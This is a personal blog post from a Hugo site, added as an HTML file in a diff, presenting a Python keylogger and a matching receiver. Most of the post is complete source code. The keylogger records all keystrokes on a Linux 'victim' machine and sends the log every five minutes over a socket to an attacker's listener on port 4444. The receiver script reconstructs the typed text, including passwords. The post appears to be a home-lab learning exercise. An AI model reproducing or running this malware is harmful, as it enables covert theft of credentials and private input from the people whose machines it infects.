@@ -1,0 +1,210 @@
+<!doctype html><html class="not-ready text-sm lg:text-base" style=--bg:#faf6f1 lang=en-us><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>Python Keylogger With Sockets - Darren Fitzpatrick</title><meta name=theme-color><meta name=description content="I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents. The keylog content is also parsed to be presented neatly.
+They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket. keylogging script ran on victim&rsquo;s computer:
+#Python keylogger for linux and socket connection to send keylog #4/14/2023 import socket import os import pyxhook import time def send_file(): BUFFER_SIZE = 4096 # send 4096 bytes each time step host = &#34;192."><meta name=author content="Darren Fitzpatrick"><link rel="preload stylesheet" as=style href=https://darefitz.github.io/main.min.css><script defer src=https://darefitz.github.io/highlight.min.js onload=hljs.initHighlightingOnLoad()></script>
+<link rel=preload as=image href=https://darefitz.github.io/theme.png><link rel=preload as=image href=https://darefitz.github.io/github.svg><link rel=icon href=https://darefitz.github.io/favicon.ico><link rel=apple-touch-icon href=https://darefitz.github.io/apple-touch-icon.png><meta name=generator content="Hugo 0.111.3"><meta property="og:title" content="Python Keylogger With Sockets"><meta property="og:description" content="I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents. The keylog content is also parsed to be presented neatly.
+They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket. keylogging script ran on victim&rsquo;s computer:
+#Python keylogger for linux and socket connection to send keylog #4/14/2023 import socket import os import pyxhook import time def send_file(): BUFFER_SIZE = 4096 # send 4096 bytes each time step host = &#34;192."><meta property="og:type" content="article"><meta property="og:url" content="https://darefitz.github.io/posts/python-keylogger-with-sockets/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-04-14T10:46:32-05:00"><meta property="article:modified_time" content="2023-04-14T10:46:32-05:00"><meta itemprop=name content="Python Keylogger With Sockets"><meta itemprop=description content="I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents. The keylog content is also parsed to be presented neatly.
+They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket. keylogging script ran on victim&rsquo;s computer:
+#Python keylogger for linux and socket connection to send keylog #4/14/2023 import socket import os import pyxhook import time def send_file(): BUFFER_SIZE = 4096 # send 4096 bytes each time step host = &#34;192."><meta itemprop=datePublished content="2023-04-14T10:46:32-05:00"><meta itemprop=dateModified content="2023-04-14T10:46:32-05:00"><meta itemprop=wordCount content="668"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="Python Keylogger With Sockets"><meta name=twitter:description content="I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents. The keylog content is also parsed to be presented neatly.
+They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket. keylogging script ran on victim&rsquo;s computer:
+#Python keylogger for linux and socket connection to send keylog #4/14/2023 import socket import os import pyxhook import time def send_file(): BUFFER_SIZE = 4096 # send 4096 bytes each time step host = &#34;192."></head><body class="text-black duration-200 ease-out dark:text-white"><header class="mx-auto flex h-[5rem] max-w-3xl px-8 lg:justify-center"><div class="relative z-50 mr-auto flex items-center"><a class="-translate-x-[1px] -translate-y-0.5 text-3xl font-bold" href=https://darefitz.github.io/>Darren Fitzpatrick</a><div class="btn-dark text-[0] ml-6 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 -mr-8 flex h-[5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg=`"#faf6f1"`.replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"><nav class="mt-12 flex justify-center space-x-10 dark:invert lg:mt-0 lg:ml-12 lg:items-center lg:space-x-6"><a class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6" style=--url:url(./github.svg) href=https://github.com/darefitz target=_blank rel=me>github</a></nav></div></header><main class="prose prose-neutral relative mx-auto min-h-[calc(100%-10rem)] max-w-3xl px-8 pt-16 pb-24 dark:prose-invert"><article><header class=mb-20><h1 class="!my-0 pb-2.5">Python Keylogger With Sockets</h1><div class="text-sm opacity-60"><time>Apr 14, 2023</time></div></header><section><p>I created a keylogger in python and setup sockets to allow the victim machine to send me the keylog contents.
+The keylog content is also parsed to be presented neatly.</p><p>They keylog script captures all keystrokes and after every 5 minutes sends that file to the attacker via socket.
+keylogging script ran on victim&rsquo;s computer:</p><pre><code>#Python keylogger for linux and socket connection to send keylog
+#4/14/2023
+import socket
+import os
+import pyxhook
+import time
+
+def send_file():
+    BUFFER_SIZE = 4096 # send 4096 bytes each time step
+
+    host = &quot;192.168.24.128&quot; #ENTER YOUR RECEIVEING IP HERE
+    port = 4444 #ENTER YOUR RECEIVING PORT HERE
+
+    filename = &quot;file.log&quot;
+
+    
+    #create sender socket
+    s = socket.socket()
+    print(f&quot;[+] Connecting to {host}:{port}&quot;)
+    s.connect((host,port))
+    print(&quot;[+] Connected.&quot;)
+    with open(filename, &quot;rb&quot;) as f:
+        while True:
+            #read the bytes from the file
+            bytes_read = f.read(BUFFER_SIZE)
+            if not bytes_read:
+                #file transmit is done
+                break
+
+            #send all to assure transmission
+            s.sendall(bytes_read)
+            #update progress bar
+            ###progress.update(len(bytes_read))
+    print(&quot;[+] File sent.&quot;)
+
+    #close socket
+    s.close()
+
+
+PATH = &quot;~/Desktop/keyloggerproj/file.log&quot; #ENTER PATH TO STORE KEYLOG
+#Tell keylogger where to store file:
+log_file = os.environ.get('pylogger_file', os.path.expanduser(PATH))
+
+#allow a cancel key for example purposes
+cancel_key = ord(os.environ.get('pylogger_cancel','`')[0])
+
+#allow clearing the log file on start, if pylogger_clean is defined
+if os.environ.get('pylogger_clean', None) is not None:
+    try:
+        os.remove(log_file)
+    except EnvironmentError:
+        #file does not exist or incorrect permissions 
+        pass
+
+#create key event and saving it into log file
+def OnKeyPress(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.Key))
+
+#create a hook manager object
+new_hook = pyxhook.HookManager()
+new_hook.KeyDown = OnKeyPress
+#set the hook
+new_hook.HookKeyboard()
+try:
+    new_hook.start() #start the hook
+except KeyboardInterrupt:
+    #use used cancel key
+    pass
+except Exception as ex:
+    #Write exceptions to the log file
+    msg = 'Error while catching events:\n {}'.format(ex)
+    pyxhook.print_err(msg)
+    with open(log_file, 'a') as f:
+        f.write('\n{}'.format(msg))
+
+while True:
+    time.sleep(300)
+    send_file()
+</code></pre><p>The receiving script opens a socket and allows connection, any files sent are parsed and saved locally as file.log</p><p>The receiving script:</p><pre><code>#Socket that accepts and parses keylog file
+#4/14/23
+
+import socket
+import os
+
+def parse_string(file_content):
+    newString = &quot;&quot;
+    for word in file_content.split():
+        newString += word
+        if &quot;BackSpace&quot; in word:
+            newString = newString[:-10]
+        if &quot;P_Enter&quot; in word:
+            newString = newString[:-7]
+            newString += ' '
+        if &quot;space&quot; in word:
+            newString = newString[:-5]
+            newString += ' '
+        if &quot;period&quot; in word:
+            newString = newString[:-6]
+            newString += '.'
+        if &quot;Return&quot; in word:
+            newString = newString[:-6]
+            newString += '\n'
+        if &quot;Shift_L&quot; in word:
+            newString = newString[:-7]
+
+        if &quot;exclam&quot; in word:
+            newString = newString[:-6]
+            newString += '!'
+        if &quot;at&quot; in word:
+            newString = newString[:-2]
+            newString += '@'
+        if &quot;numbersign&quot; in word:
+            newString = newString[:-10]
+            newString += '#'
+        if &quot;dollar&quot; in word:
+            newString = newString[:-6]
+            newString += '$'
+        if &quot;percent&quot; in word:
+            newString = newString[:-7]
+            newString += '%'
+        if &quot;asciicircum&quot; in word:
+            newString = newString[:-11]
+            newString += '^'
+        if &quot;ampersand&quot; in word:
+            newString = newString[:-9]
+            newString += '&amp;'
+        if &quot;asterisk&quot; in word:
+            newString = newString[:-8]
+            newString += '*'
+        if &quot;parenleft&quot; in word:
+            newString = newString[:-9]
+            newString += '('
+        if &quot;parenright&quot; in word:
+            newString = newString[:-10]
+            newString += ')'
+    return newString
+
+SERVER_HOST = &quot;0.0.0.0&quot;
+SERVER_PORT = 4444
+
+#recieve 4096 bytes each time
+BUFFER_SIZE = 4096
+
+s = socket.socket()
+s.bind((SERVER_HOST, SERVER_PORT))
+
+s.listen(5)
+print(f&quot;[*] Listening as {SERVER_HOST}:{SERVER_PORT}&quot;)
+while(1):
+
+    client_socket, address = s.accept()
+
+    print(f&quot;[+] {address} is connected.&quot;)
+
+    #recieve file info
+    #recieve using client socket, not server socket
+    #recieved = client_socket.recv(BUFFER_SIZE).decode()
+    #filename = recieved
+    #remove abs path
+    #filename = os.path.basename(filename)
+
+    filename = &quot;file.log&quot;
+
+    #recieve file from the socket
+
+    with open(filename, &quot;w&quot;) as f:
+        while True:
+            #read 1024 bytes fromt he socket
+            bytes_read = client_socket.recv(BUFFER_SIZE)
+            #bytes_read.replace('\n', ' ')
+            string_read = bytes_read.decode('utf-8')
+            
+            #for line in string_read.splitlines():
+                #print(line)
+                #if line == 'space':
+                    #print(&quot;SPACE IS TRUE&quot;)
+
+            string_read = string_read.replace('\n', ' ')
+            fstring_read = string_read.replace('Space', '')
+            #string_read = string_read.replace('P_Enter', '')
+            #string_read = string_read.replace('space', '')
+
+
+            print(f&quot;{string_read}&quot;)
+            if not bytes_read:
+                #nothing recieved file transmiting is done
+                break
+            #write to file the bytes we recieve
+            file_content = parse_string(string_read)
+            f.write(file_content)
+
+
+client_socket.close()
+</code></pre><p>Victim running keylog.py and after 5 min the log is sent:</p><p><img src=/keylog1.png alt="Victim running keylog.py"></p><p>Attacker running receive.py and receiving keylog contents after 5 min:</p><p><img src=/keylog2.png alt="Attacker running receive.py"></p><p>Seeing that the log was successfully received:
+<img src=/keylog3.png alt="received log"></p><p>Looking at the contents of the example after 5 min of use:
+<img src=/keylog4.png alt="example log"></p></section><nav class="mt-24 flex rounded-lg bg-black/[3%] text-lg dark:bg-white/[8%]"><a class="ml-auto flex w-1/2 items-center justify-end rounded-r-md p-6 pl-3 no-underline hover:bg-black/[2%] dark:hover:bg-white/[3%]" href=https://darefitz.github.io/posts/home-lab-ad/><span>Setting up a Home Lab with Active Directory and 1k+ users</span><span class=ml-1.5>→</span></a></nav></article></main><footer class="opaco mx-auto flex h-[5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"><div class=mr-auto>&copy; 2023
+<a class=link href=https://darefitz.github.io/>Darren Fitzpatrick</a></div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>Powered by Hugo️️</a>️
+<a class=link href=https://github.com/nanxiaobei/hugo-paper rel=noopener target=_blank>Theme Paper</a></footer></body></html>
